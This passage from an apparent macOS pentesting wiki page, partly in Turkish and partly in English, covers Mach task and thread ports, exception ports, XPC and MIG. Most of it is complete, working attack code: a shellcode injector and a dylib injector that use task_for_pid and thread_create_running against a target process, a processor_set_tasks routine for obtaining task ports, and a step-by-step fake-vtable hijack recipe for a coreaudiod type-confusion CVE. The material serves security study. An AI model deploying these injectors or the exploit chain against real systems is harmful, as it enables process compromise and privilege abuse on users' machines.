**The task name port:** _task port'un_ ayrıcalıksız bir versiyonudur. Task'ı referans eder, ancak kontrol etmesine izin vermez. Görünen tek kullanılabilir şey `task_info()`'dur.

### Thread Ports

Thread'lerin de ilişkili portları vardır; bunlar **`task_threads`** çağrısını yapan task tarafından ve işlemci tarafından `processor_set_threads` ile görülebilir. Thread portu üzerinde bir SEND right, `thread_act` alt sistemi içindeki fonksiyonları kullanmaya izin verir; örneğin:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Herhangi bir thread bu portu alabilir, `mach_thread_sef` çağırarak.

### Shellcode Injection in thread via Task port

Bir shellcode'u şu kaynaktan alabilirsiniz:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Derleyin** önceki programı ve aynı kullanıcıyla kod enjekte edebilmek için **entitlements** ekleyin (aksi takdirde **sudo** kullanmanız gerekir).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Bunun iOS'ta çalışması için yazılabilir bir belleği yürütülebilir hale getirebilmek amacıyla `dynamic-codesigning` yetkisine sahip olmanız gerekir.

### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **it's not posix compliant**.

It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

When calling `task_for_pid` or `thread_create_*` increments a counter in the struct task from the kernel which can by accessed from user mode calling task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

When a exception occurs in a thread, this exception is sent to the designated exception port of the thread. If the thread doesn't handle it, then it's sent to the task exception ports. If the task doesn't handle it, then it's sent to the host port which is managed by launchd (where it'll be acknowledge). This is called exception triage.

Note that at the end usually if not properly handle the report will end up being handle by the ReportCrash daemon. However, it's possible for another thread in the same task to manage the exception, this is what crash reporting tools like `PLCreashReporter` does.

## Diğer Nesneler

### Clock

Any user can access information about the clock however in order to set the time or modify other settings one has to be root.

In order to get info its possible to call functions from the `clock` subsystem like: `clock_get_time`, `clock_get_attributtes` or `clock_alarm`\
In order to modify values the `clock_priv` subsystem can be sued with functions like `clock_set_time` and `clock_set_attributes`

### Processors and Processor Set

The processor apis allows to control a single logical processor calling functions like `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Moreover, the **processor set** apis provides a way to group multiple processors into a group. It's possible to retrieve the default processor set calling **`processor_set_default`**.\
These are some interesting APIs to interact with the processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
Nowadays you need root to use that function and this is protected so you will only be able to get these ports on unprotected processes.

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
